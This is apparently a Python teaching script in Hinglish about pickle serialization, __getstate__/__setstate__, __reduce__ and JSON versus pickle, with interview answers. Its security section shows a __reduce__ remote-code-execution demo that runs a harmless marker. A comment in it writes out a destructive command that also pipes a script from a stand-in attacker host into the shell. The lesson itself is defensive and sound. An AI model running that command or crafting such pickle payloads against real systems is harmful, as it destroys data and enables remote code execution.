"""
================================================================================
TOPIC: Pickling & Serialization (pickle.dumps/loads, __getstate__/__setstate__,
       __reduce__, security, json vs pickle — production angle)
================================================================================

KYA HOTA HAI:
    Pickle ek Python-native serialization hai: live Python object ko bytes me
    badalta (pickle.dumps) aur wapas object bana deta (pickle.loads). Ye object
    ka TYPE + state dono encode karta — dict, list, custom class instance, sab.
    JSON sirf primitive data (str/num/bool/list/dict) handle karta; pickle pura
    Python object graph (references, custom classes) handle kar leta.

KYO NEED PADI:
    Object ko process ke bahar bhejne ke liye serialize karna padta — disk pe
    save, Redis/Celery broker pe queue, ya multiprocessing me child process ko
    arg dena. In sab jagah object ko "flatten to bytes" karna padta hai. Pickle
    isliye default banaa kyunki ye full Python object ko byte-for-byte rebuild
    kar deta bina manual to_dict/from_dict likhe.

KAISE USE KARTE HAIN:
    pickle.dumps(obj) -> bytes ; pickle.loads(b) -> obj. File ke liye dump/load.
    Object picklable tab hota jab uska saara state picklable ho. Agar object me
    NON-picklable cheez hai (lock, socket, DB connection, file handle, thread),
    to __getstate__ (kya save karna hai) aur __setstate__ (load pe kaise rebuild)
    define karo. Low-level construction control ke liye __reduce__.

KAHAN USE HOTA HAI (backend scenarios):
    1. Celery/Redis: task args + return value broker pe serialize hote. Agar task
       ko DB session ya connection-holding object pass kar diya -> "cannot pickle"
       crash. Isliye Celery prod me JSON serializer hi recommend karta.
    2. SAP HANA connector: agar connector object (jisme live db connection hai) ko
       ProcessPool worker ko bhej diya -> pickle fail. Fix: connection ko strip
       karke worker me reconnect (__getstate__/__setstate__).
    3. multiprocessing Pool.map: args/return picklable hone chahiye warna spawn fail.
    4. Cache: function ka computed result Redis me pickle/json karke store.
    5. Niroskos SaaS: session/feature-flag object cache karna — but NEVER untrusted
       pickle load karna (RCE risk), tenant input ko json se hi parse karo.

INTERVIEW ANSWER (English — recite this):
    "Pickling is Python's native serialization: it turns a live object graph into
    bytes and reconstructs the exact object, including its type, on load. It's what
    multiprocessing and a default-configured Celery use under the hood to ship task
    arguments and results across process or broker boundaries. The catch is that an
    object is only picklable if its entire state is — so anything holding a lock,
    socket, file handle, or a live database connection will raise 'cannot pickle' the
    moment it crosses a process boundary, which is a classic failure when someone
    passes a connector object into a ProcessPool or Celery task. The clean fix is to
    implement __getstate__ to strip the unpicklable handles before serialization and
    __setstate__ to rebuild them on the other side, rather than trying to pickle the
    connection itself. The two non-negotiable senior points: first, never unpickle
    untrusted data — pickle.loads can execute arbitrary code via __reduce__, so it's
    a remote-code-execution vector, which is exactly why you set Celery's serializer
    to JSON for anything crossing a trust boundary. Second, pickle is Python-only and
    not stable across versions or class changes, so for durable storage or
    cross-language APIs I use JSON or a schema format, and reserve pickle for trusted,
    short-lived, internal Python-to-Python transfer."

================================================================================
Run:
    python 24_pickling_serialization.py        # saare sections chalao
    python 24_pickling_serialization.py 2 5    # sirf section 2 aur 5

Sections:
    1. DEMO  — pickle.dumps/loads roundtrip + kya picklable hai kya nahi
    2. REAL  — SAP HANA-style connector ProcessPool me: "cannot pickle" crash
    3. REAL  — fix with __getstate__/__setstate__ (strip handle + rebuild) + __reduce__
    4. BREAK — pickle SECURITY: untrusted unpickle = code execution (RCE) demo
    5. DEMO  — json vs pickle tradeoff (cross-lang/safe vs full-object/fast)
    6. TODO  — tum khud likho: CachedClient with picklable state (strip socket)
================================================================================
"""
from __future__ import annotations

import json
import multiprocessing as mp
import pickle
import sys
import threading


# === SECTION 1: DEMO — dumps/loads roundtrip + what is picklable ===
class Money:
    """Plain data class — saara state (int, str) picklable hai, isliye ye object
    bina kuch extra kiye pickle ho jaata."""

    def __init__(self, amount: int, currency: str) -> None:
        self.amount = amount
        self.currency = currency

    def __repr__(self) -> str:
        return f"Money({self.amount}, {self.currency!r})"


def section1() -> None:
    print("\n=== SECTION 1: DEMO — pickle.dumps/loads roundtrip + picklable kya hai ===")

    obj = {"txn_id": "T-1001", "amount": Money(4999, "INR"), "items": [1, 2, 3]}
    blob = pickle.dumps(obj)              # object graph -> bytes
    back = pickle.loads(blob)             # bytes -> naya object (deep copy jaisa)
    print(f"    original : {obj}")
    print(f"    bytes len: {len(blob)} bytes (binary protocol)")
    print(f"    restored : {back}")
    print(f"    restored Money type preserved? {type(back['amount']).__name__}")
    print(f"    same object identity? {back is obj}  (NO — loads naya object banata)")

    # Kya picklable hai: module-level classes/functions (by qualified name), aur
    # built-in data. Kya NAHI: lambda, local/nested function, lock, socket, file.
    print("\n    picklable check (pickle.dumps try karke):")
    samples = {
        "int/str/list/dict": {"a": [1, 2], "b": "x"},
        "Money instance": Money(10, "USD"),
        "lambda": (lambda x: x),               # FAIL: lambda picklable nahi
        "threading.Lock": threading.Lock(),    # FAIL: lock OS resource hai
        "generator object": (x for x in [1, 2]),  # FAIL: live iterator state
    }
    for label, val in samples.items():
        try:
            pickle.dumps(val)
            print(f"      OK   : {label}")
        except Exception as e:
            print(f"      FAIL : {label:18s} -> {type(e).__name__}")


# === SECTION 2: REAL — SAP HANA-style connector in ProcessPool: cannot pickle ===
class _FakeConnection:
    """Live DB connection ka stand-in. Iske andar ek Lock hai (real connections me
    socket/lock/file-descriptor hota) — yahi cheezein pickle nahi hotin."""

    def __init__(self, dsn: str) -> None:
        self.dsn = dsn
        self._lock = threading.Lock()      # <- ye non-picklable hai (asli culprit)

    def query(self, sql: str) -> str:
        return f"[{self.dsn}] result-for({sql})"


class HanaConnectorBroken:
    """GALTI: connector live connection ko apne andar rakhta hai, aur khud ko
    seedha pickle hone deta. ProcessPool ko bhejte hi 'cannot pickle' crash."""

    def __init__(self, dsn: str) -> None:
        self.dsn = dsn
        self.conn = _FakeConnection(dsn)   # live handle held -> pickle me phasega

    def fetch(self, sql: str) -> str:
        return self.conn.query(sql)


def _worker_uses_connector(args: tuple) -> str:
    """ProcessPool worker — connector + sql lekar fetch karta. args worker ko bhejne
    ke liye PICKLE hote hain, isliye connector picklable hona chahiye."""
    connector, sql = args
    return connector.fetch(sql)


def section2() -> None:
    print("\n=== SECTION 2: REAL — connector ko ProcessPool me bhejna: cannot pickle ===")

    broken = HanaConnectorBroken("hana://prod/GL")
    print("    GALTI: live-connection wala connector Pool worker ko pass kar rahe...")
    try:
        # Pool tak pahunchne se PEHLE hi local pickle.dumps fail ho jaata —
        # wahi error process bhi dega, isliye seedha dumps se demo (fast + deterministic).
        pickle.dumps(broken)
        print("    (agar yahan aaye to is platform ne allow kiya — unexpected)")
    except Exception as e:
        print(f"    -> CRASH as expected: {type(e).__name__}: {str(e)[:55]}...")
        print("    reason: connector ke andar _FakeConnection -> uske andar Lock (non-picklable)")
        print("    yahi 'cannot pickle _thread.lock / socket / connection' wala classic error hai")
    print("    (Celery task ko DB session pass karne pe bhi bilkul yahi crash aata)")


# === SECTION 3: REAL — fix with __getstate__/__setstate__ (strip + rebuild) ===
class HanaConnectorFixed:
    """FIX: pickle hone se pehle live connection ko STRIP karo, aur doosri side pe
    REBUILD karo. Pickle me sirf reconnect-info (dsn) jaata, handle nahi."""

    def __init__(self, dsn: str) -> None:
        self.dsn = dsn
        self.conn = _FakeConnection(dsn)

    def fetch(self, sql: str) -> str:
        return self.conn.query(sql)

    def __getstate__(self) -> dict:
        # Pickle isko call karta "kya save karu?" — live conn HATA do, baaki state lo.
        state = self.__dict__.copy()
        state["conn"] = None               # strip the unpicklable live handle
        return state

    def __setstate__(self, state: dict) -> None:
        # Doosri process/load pe pickle isko call karta — yahan handle REBUILD karo.
        self.__dict__.update(state)
        self.conn = _FakeConnection(self.dsn)  # fresh connection in child process


def _worker_fixed(args: tuple) -> str:
    connector, sql = args
    return connector.fetch(sql)


def section3() -> None:
    print("\n=== SECTION 3: REAL — fix: __getstate__/__setstate__ (strip + rebuild) ===")

    fixed = HanaConnectorFixed("hana://prod/GL")
    blob = pickle.dumps(fixed)             # ab pickle ho gaya (conn stripped)
    restored = pickle.loads(blob)
    print(f"    pickle OK: {len(blob)} bytes (conn stripped, sirf dsn gaya)")
    print(f"    restored.conn rebuilt? {restored.conn is not None} (setstate ne nayi banayi)")
    print(f"    restored.fetch('SELECT 1') = {restored.fetch('SELECT 1')}")

    # Ab sach me ProcessPool me chala ke dikhao — child me reconnect ho ke chalta:
    work = [(fixed, "SELECT * FROM GL"), (fixed, "SELECT count(*) FROM AR")]
    with mp.Pool(processes=2) as pool:
        out = pool.map(_worker_fixed, work)
    print(f"    ProcessPool results (child me reconnect hua): {out}")

    # __reduce__ (brief): __reduce__ pickle ko batata "rebuild kaise karna" — ek
    # tuple return karta (callable, args). Custom/low-level control ke liye, ya jab
    # object normal tarike se rebuild na ho sake. (getstate/setstate zyada common+safe.)
    print("\n    __reduce__ (brief): callable + args ka tuple return karta hai —")
    print("    pickle usi se object rebuild karta. Niche ek minimal example:")
    rd = _ReduceDemo(7)
    print(f"      before: {rd}  ->  reduce spec: {rd.__reduce__()}")
    print(f"      after pickle roundtrip: {pickle.loads(pickle.dumps(rd))}")
    print("    NOTE: __reduce__ powerful hai — isi mechanism ka SECTION 4 me misuse RCE deta")


class _ReduceDemo:
    """__reduce__ ko (callable, args) tuple return karna sikhata. Yahan safe use:
    rebuild = _ReduceDemo(self.x)."""

    def __init__(self, x: int) -> None:
        self.x = x

    def __reduce__(self):
        # (callable, args-tuple) -> unpickle pe `_ReduceDemo(self.x)` call hoga.
        return (self.__class__, (self.x,))

    def __repr__(self) -> str:
        return f"_ReduceDemo(x={self.x})"


# === SECTION 4: BREAK IT / GOTCHA — pickle SECURITY: untrusted unpickle = RCE ===
class _Exploit:
    """Attacker-controlled object. __reduce__ pickle ko bolta 'unpickle pe ye
    callable chala do' — yahan humne SAFE marker function rakha, par asli attack
    me ye os.system / subprocess ho sakta. Yahi pickle ka RCE vector hai."""

    def __reduce__(self):
        # ASLI attack: return (os.system, ("rm -rf / ; curl evil.sh | sh",))
        # Hum demo me bilkul harmless marker function chalate (koi side effect nahi):
        return (_pwned_marker, ("attacker-controlled-code-ran",))


def _pwned_marker(tag: str) -> str:
    """Ye function pickle.loads ke ANDAR khud-ba-khud call ho jaata — humne kuch
    bhi nahi bola loads ko 'chalao', sirf bytes diye the. Yahi danger hai."""
    print(f"      [!] pickle.loads ke DURING ye code chala -> tag={tag!r}")
    return tag


def section4() -> None:
    print("\n=== SECTION 4: BREAK IT — untrusted pickle load = arbitrary code (RCE) ===")

    # Attacker ek aisa payload bana ke deta (e.g. webhook/queue me) jo dikhne me
    # bas 'data' hai, par load karte hi code chalata.
    malicious_bytes = pickle.dumps(_Exploit())
    print(f"    'innocent-looking' bytes mile (len={len(malicious_bytes)}). Ab load karte:")
    print("    WRONG: pickle.loads(untrusted_bytes)  <- iske andar attacker code chalta:")
    result = pickle.loads(malicious_bytes)   # <- yahin code execute ho gaya
    print(f"    loads returned: {result!r}  (humne kuch 'run' nahi bola tha!)")
    print("    => pickle.loads execution hai, parsing nahi. Untrusted source = RCE.")

    print("\n    FIX: untrusted/cross-trust-boundary data ke liye pickle MAT use karo.")
    print("    JSON use karo — json.loads sirf data parse karta, code nahi chalata:")
    try:
        json.loads('{"amount": 100, "currency": "INR"}')  # safe, pure data
        print("      json.loads('{...}') -> safe data parse, koi callable invoke nahi")
    except Exception as e:                                # pragma: no cover
        print(f"      json error: {e}")
    print("    Production rule: Celery serializer='json', webhooks/inputs ko kabhi unpickle mat karo.")


# === SECTION 5: DEMO — json vs pickle tradeoff ===
def section5() -> None:
    print("\n=== SECTION 5: DEMO — json vs pickle tradeoff ===")

    payload = {"txn_id": "T-9", "amount": 4999, "currency": "INR", "items": [1, 2]}

    j = json.dumps(payload)
    p = pickle.dumps(payload)
    print(f"    json.dumps  -> str  , len={len(j):3d} : {j}")
    print(f"    pickle.dumps-> bytes, len={len(p):3d} : {p[:30]!r}...")

    print("\n    JSON: human-readable, cross-language, SAFE to parse untrusted,")
    print("          stable for storage/APIs. BUT sirf primitive types (no custom obj,")
    print("          no datetime/Decimal without custom encoder, no tuples-as-tuples).")
    print("    PICKLE: full Python object graph (custom classes, refs), no schema needed.")
    print("          BUT Python-only, UNSAFE on untrusted, NOT stable across versions/")
    print("          class changes (rename field/class -> old pickle toot jaata).")

    # Concrete: Money (custom object) ko json me seedha nahi daal sakte ->
    print("\n    custom object json me seedha nahi jaata:")
    try:
        json.dumps({"amount": Money(10, "INR")})
    except TypeError as e:
        print(f"      json.dumps(Money) -> TypeError: {str(e)[:48]}... (custom encoder chahiye)")
    print(f"      pickle.dumps(Money) -> OK, full object roundtrips: "
          f"{pickle.loads(pickle.dumps(Money(10, 'INR')))}")
    print("\n    RULE OF THUMB: cross-boundary/storage/untrusted -> JSON;")
    print("    trusted internal Python<->Python (multiprocessing, short-lived cache) -> pickle.")


# === SECTION 6: TODO — tum khud likho: CachedClient with picklable state ===
class CachedClient:
    """
    TODO (tum implement karo):
      Ye client ek live 'socket' (yahan _FakeConnection se simulate) hold karta hai
      aur ek picklable config (host, ttl). Problem: live handle pickle nahi hota,
      to ProcessPool/Celery me bhejte hi crash. Tumhe ise PICKLABLE banana hai bina
      handle ko serialize kiye.

      Steps:
        1. __init__(self, host, ttl): self.host=host, self.ttl=ttl, aur
           self.sock = _FakeConnection(host) set karo (ye non-picklable handle hai).
        2. __getstate__: __dict__ ki copy lo, usme 'sock' ko None kar do (strip),
           aur wo dict return karo. (host/ttl save honge, handle nahi.)
        3. __setstate__(state): __dict__ update karo, fir self.sock ko
           _FakeConnection(self.host) se REBUILD karo (fresh handle is process me).
        4. ping(self): return f"pong from {self.host}" (sirf kuch kaam dikhane ko).

      Expected (section6 ise verify karega):
        - pickle.dumps(client) bina error ke chale
        - restored = pickle.loads(blob); restored.sock is not None  (rebuild hua)
        - restored.host == original host, restored.ttl == original ttl
    """

    def __init__(self, host: str, ttl: int = 60) -> None:
        raise NotImplementedError("TODO: CachedClient.__init__ likho (host, ttl, sock)")

    # def __getstate__(self) -> dict: ...
    # def __setstate__(self, state: dict) -> None: ...
    # def ping(self) -> str: ...


def section6() -> None:
    print("\n=== SECTION 6: TODO — CachedClient picklable state (tum likho) ===")
    try:
        client = CachedClient("cache-1.internal", ttl=120)
        blob = pickle.dumps(client)
        restored = pickle.loads(blob)
        checks = [
            ("pickle.dumps worked", isinstance(blob, (bytes, bytearray))),
            ("sock rebuilt (not None)", getattr(restored, "sock", None) is not None),
            ("host preserved", getattr(restored, "host", None) == "cache-1.internal"),
            ("ttl preserved", getattr(restored, "ttl", None) == 120),
        ]
        for label, ok in checks:
            print(f"    [{'PASS' if ok else 'FAIL'}] {label}")
        print(f"    ping() -> {restored.ping()}")
    except NotImplementedError as e:
        print(f"  abhi unimplemented (TODO complete karo): {e}")
    except Exception as e:
        print(f"  TODO adhura/galat lag raha: {type(e).__name__}: {e}")


# === MAIN DISPATCHER ===
def main() -> None:
    sections = {
        "1": section1,
        "2": section2,
        "3": section3,
        "4": section4,
        "5": section5,
        "6": section6,
    }
    args = sys.argv[1:]
    to_run = args if args else list(sections.keys())
    for key in to_run:
        fn = sections.get(key)
        if fn is None:
            print(f"[skip] unknown section: {key!r} (valid: {', '.join(sections)})")
            continue
        fn()


if __name__ == "__main__":
    # spawn-safe: saara process-spawning sirf is guard ke andar se hota hai.
    main()
